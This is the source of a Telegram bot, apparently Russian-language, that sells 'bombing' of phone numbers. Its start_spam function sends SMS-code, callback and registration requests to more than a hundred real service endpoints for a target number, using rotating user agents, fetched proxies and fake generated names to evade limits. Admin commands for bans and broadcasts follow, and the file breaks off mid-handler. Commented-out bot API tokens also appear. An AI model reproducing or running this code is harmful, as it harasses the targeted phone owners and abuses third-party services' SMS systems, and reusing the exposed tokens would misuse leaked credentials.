import asyncio
import logging
from functools import wraps
from random import choice, randint
import pytz
from requests import get, post
import json
import db
import string
from user_agent import generate_user_agent
from aiogram import Bot, Dispatcher, executor, types
import os
import datetime
import pandas as pd
from threading import Thread

# API_TOKEN = '1259319034:AAF5MsqRdFFM-ejWFTBK7Pv6_sARt8ZBEEU'
API_TOKEN = ''
# API_TOKEN = '1175687437:AAFv_8YDUY_dJ9xwa1_w0gxMyTh__aqn2WM'
# API_TOKEN = '1108438638:AAEHZwkY96eYtq6lY8sVQ-mGKVAJ0o9a-a0'
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dat = {}
data = {}
from aiogram.utils.callback_data import CallbackData

posts_cb: CallbackData = CallbackData('search', 'action', 'id', 'sum', 'other')
menu = ["😡Начать бомбить😡","📄Профиль📄","♥️Связь с админом♥️","🍳Услуги🍳"]


def start_spam(phone, proxies):
    # await asyncio.sleep(1)
    def format_phone(phone, phone_mask):
        phone_list = list(phone)
        for i in phone_list:
            phone_mask = phone_mask.replace("#", i, 1)
        return phone_mask

    def generate_proxy():
        proxy = get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
        return {"http": proxy, "https": proxy}

    name = ""
    for _ in range(12):
        name += choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
        password = name + choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
        email = name + "@gmail.com"
    phone9 = phone[1:]
    headers = {"User-Agent": generate_user_agent()}
    kk = True
    count = 0
    while kk:

        _name = ''
        for x in range(12):
            _name = _name + choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        try:
            post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": phone, "username": username})
            print('[+] Twitch отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, headers=headers)
            print('[+] Tinkoff отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://zoloto585.ru/api/bcard/reg/", json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": formatted_phone, "email": "", "city": ""}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone[1:], "8(###)###-##-##")
            post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://yaponchik.net/login/login.php", data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": formatted_phone, "code": ""}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": phone, "email": email, "smsCode": ""}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": name}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://b.utair.ru/api/v1/login/", json={"login": phone, "confirmation_type": "call_code"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "#(###)###-##-##")
            post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, proxies=proxies)
        except:
            pass
        try:
            post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635", "User-Agent": generate_user_agent()}, json={"phone": phone}, proxies=proxies)
        except:
            pass
        try:
            post("https://secure.ubki.ua/b2_api_xml/ubki/auth", json={"doc": {"auth": {"mphone": "+" + phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0", "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json", "User-Agent": generate_user_agent()}, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "8(###)###-##-##")
            post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://thehive.pro/auth/signup", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ### - ## - ##")
            post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={"RECALL": "Y", "BACK_CALL_PHONE": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callback_phonenumber", "phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone9, "name": name}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8(###)###-##-##")
            post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            post("http://sushigourmet.ru/auth", data={"phone": formatted_phone, "stage": 1}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            post("https://pizzasushiwok.ru/index.php", data={"mod_name": "registration", "tpl": "restore_password", "phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" + phone, "action": "confirm_mobile"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" + phone, "resend": 0}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://shafa.ua/api/v3/graphiql", json={"operationName": "sendResetPasswordSms", "variables": {"phoneNumber": "+" + phone}, "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://rieltor.ua/api/users/register-sms/", json={"phone": phone, "retry": 0}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#(###)###-##-##")
            post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/", data={"phone": formatted_phone, "alien": "0"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code", params={"number": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": formatted_phone}}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8-###-###-##-##")
            post("https://pizzasushiwok.ru/index.php", data={"mod_name": "call_me", "task": "request_call", "name": name, "phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+" + phone, "method": "sendCode"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            post("https://pizza46.ru/ajaxGet.php", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+#-###-###-##-##")
            post("https://paylate.ru/registry", data={"mobile": formatted_phone, "first_name": name, "last_name": name, "nick_name": name,  "gender-client": 1, "email": email, "action": "registry"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-####")
            post("https://www.osaka161.ru/local/tools/webstroy.webservice.php", data={"name": "Auth.SendPassword", "params[0]": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "8 (###) ###-##-##")
            get("https://okeansushi.ru/includes/contact.php", params={"call_mail": "1", "ajax": "1", "name": name, "phone": formatted_phone, "call_time": "1", "pravila2": "on"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode", "phone": phone, "registration": "N"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://account.my.games/signup_send_sms/", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://auth.multiplex.ua/login", json={"login": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.moyo.ua/identity/registration", data={"firstname": name, "phone": phone, "email": email}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": name, "phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + phone, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://mobileplanet.ua/register", data={"klient_name": name, "klient_phone": "+" + phone, "klient_email": email}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html", data={"user_info[fullname]": name, "user_info[phone]": phone, "user_info[email]": email, "user_info[password]": password, "user_info[conf_password]": password}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", data={"phone": phone, "do": "phone"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# ### ### ## ##")
            get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, "cb_phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": generate_user_agent()}, proxies=proxies)
        except:
            pass
        try:
            post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website", "User-Agent": generate_user_agent()}, json={"Phone": phone, "Type": 1}, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "# (###) ###-##-##")
            post("https://kilovkusa.ru/ajax.php", params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"}, data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://izi.ua/api/auth/register", json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2", headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": generate_user_agent()}, json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": name, "Gender": "M", "LastName": name, "SecondName": name, "Phone": phone9, "Email": email}, proxies=proxies)
        except:
            pass
        try:
            post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone9}}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://foodband.ru/api?call=calls", data={"customerName": name, "phone": formatted_phone, "g-recaptcha-response": ""}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone9, "g-recaptcha-response": ""}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, data={"loginId": "+" + phone}, proxies=proxies)
        except:
            pass
        try:
            post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, json={"loginId": "+" + phone, "supportAllStates": True}, proxies=proxies)
        except:
            pass
        try:
            post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://findclone.ru/register", params={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://2407.smartomato.ru/account/session", json={"phone": formatted_phone, "g-recaptcha-response": None}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://www.etm.ru/cat/runprog.html", data={"m_phone": phone9, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+## (###) ###-##-##")
            post("https://e-groshi.com/online/reg", data={"first_name": name, "last_name": name, "third_name": name, "phone": formatted_phone, "password": password, "password2": password}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.easypay.ua/api/auth/register", json={"phone": phone, "password": password}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://api.creditter.ru/confirm/sms/send", json={"phone": formatted_phone, "type": "register"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://cinema5.ru/api/phone_code", data={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", "User-Agent": generate_user_agent()}, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "(###)###-##-##")
            post("https://bluefin.moscow/auth/register/", data={"phone": formatted_phone, "sendphone": "Далее"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://app.benzuber.ru/login", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://bartokyo.ru/ajax/login.php", data={"user_phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone9, "(###) ###-##-##")
            get("https://avtobzvon.ru/request/makeTestCall", params={"to": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://oauth.av.ru/check-phone", json={"phone": formatted_phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            formatted_phone = format_phone(phone[1:], "# (###) ###-##-##")
            post("https://www.estaxi.org/taxi/30738/", data={"bxajaxid": "9ea29539ac24f7239adeab8449bebf5b", "AJAX_CALL": "Y", "sessid": "fb9907b6ac382368162cad4e1e86c567", "phone_intl": "+"+phone, "phone": formatted_phone,}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            print(1111)
            # formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://user.bolt.eu/user/register/phone?version=CB.3.43&deviceId=ee9a3a04-b763-4f8d-965a-78196f095c25&deviceType=web&device_name=MacIntel&device_os_version=5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F87.0.4280.67%20Safari%2F537.36&country=ua&language=ru-RU&cache=", data={"phone": "+"+phone, 'phone_uuid': "8fc4bf68-a8c2-4107-ab1e-88d82fd92f8d", "preferred_verification_method": "sms"}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            # formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            get(f"https://api.eldorado.ua/v2.0/sign?lang=ua&action=phone_check&login={phone}", headers=headers, proxies=proxies)
        except:
            pass

        count+=1
        if count == 3:
            break

admins = [303725659,573264562]

@dp.message_handler(commands=['cusers'])
async def user(message):
    await bot.send_message(message.chat.id,f"""Статистика проекта:
Всего пользователей: {db.all_users()}
За сегодня новых пользователей: {db.users()}""")

@dp.message_handler(commands=['block'])
async def block(message):
    user_id = message.text.replace('/block ','')
    if message.chat.id in admins:
        db.block(user_id)
        await bot.send_message(message.chat.id, f"""Пользователь забанен""")

@dp.message_handler(commands=['white'])
async def block(message):
    number = message.text.replace('/white ','')
    if message.chat.id in admins:
        db.white(number)
        await bot.send_message(message.chat.id, f"""Номер добавлен в вайт лист""")

@dp.message_handler(commands=['unblock'])
async def block(message):
    user_id = message.text.replace('/unblock ','')
    if message.chat.id in admins:
        db.unblock(user_id)
        # user =
        await bot.send_message(message.chat.id,f"""Пользователь розбанен""")

@dp.message_handler(commands=['send'])
async def send(message):
    try:
        if int(message.chat.id) in admins:
            db.set_step(message.chat.id,'send')
            await bot.send_message(message.chat.id,
                                   'Пришлите рассылку (текст,документ,фото,видео)')
        else:
            await bot.send_message(message.chat.id,
                                   'У вас нет прав для данного действия')
    except:
        pass

@dp.message_handler(commands=['start'])
async def start_message(message):
